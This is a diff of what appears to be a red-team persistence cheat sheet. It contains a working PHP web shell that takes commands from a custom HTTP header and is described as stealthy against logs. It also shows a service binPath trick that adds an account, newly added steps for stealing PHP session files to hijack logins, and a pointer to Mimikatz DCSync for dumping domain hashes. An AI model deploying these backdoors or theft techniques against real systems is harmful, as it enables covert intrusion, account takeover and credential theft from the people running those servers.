@@ -47,7 +47,7 @@ These are all the places you can hide cron jobs:
 	- Replace the binPath property of an existing Windows service with your implant to avoid creating a new service. Simple commands can also be used as binPath, meaning `net user redteam password /add` is permissible. If you plan to use an implant as a service make sure to compile as `exe-service` with [[MSFVenom]].
 
 
-#### PHP
+#### PHP (Web Servers)
 ###### PHP Command Parameter
 If you find a web server that uses PHP, put this code snippet somewhere in the PHP page. Then, you'll be able to send commands to the website via GET and POST requests.
 ```php
@@ -69,8 +69,14 @@ echo "<pre>" . shell_exec($_SERVER['HTTP_CMD']) . "</pre>";
 ```
 Command execution example: `curl -H "CMD: ls" http://example.com/webscript.php`
 - This method sends the commands via a custom HTTP header. HTTP headers often aren't displayed in logs, so it's quite stealthy. 
-###### Steal PHP Sessions
-
+###### Stealing PHP Sessions
+- This is basically session hijacking, but with PHP. 
+- Some web servers write their session IDs to disk. When a web server does that, you can go find the file that contains the session IDs and use them to log in as an authorized user. 
+- These might not be good for long-term persistence since sessions expire, but it's worth noting nonetheless. 
+- PHP web servers sometimes store their session IDs in `var/lib/php/sessions`. The session file naming format is `sess_<SESSION_ID>`. 
+- To conduct this attack, steal a session ID and change your `PHPSESSID` cookie to it (in "inspect element" or a similar browser tool) to hijack the session and login as an authorized user.
+>[!tip] Troubleshooting Tip
+>If you can't find the session IDs in `var/lib/php/sessions`, they could still be on disk somewhere. PHP has a configuration text file called `php.ini` that's generally located in `/etc/php.ini` or `/usr/local/lib/php.ini`, so check the `php.ini` config file to see if the session IDs are stored elsewhere.
 ## Domain Persistence
 ### Credentials
 You can acquire hashes of users using [[Mimikatz]]'s DCSync functionality for every user. This will grant access to the krbtgt account for golden tickets, etc. 
